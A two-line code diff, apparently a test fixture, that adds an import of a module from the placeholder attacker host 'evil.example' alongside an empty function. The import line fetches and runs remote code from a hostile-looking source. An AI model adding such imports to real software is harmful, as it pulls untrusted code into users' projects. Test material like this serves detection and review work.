@@ -1,0 +1,2 @@
+import "https://evil.example/mod";
+fn x() { return 0; }
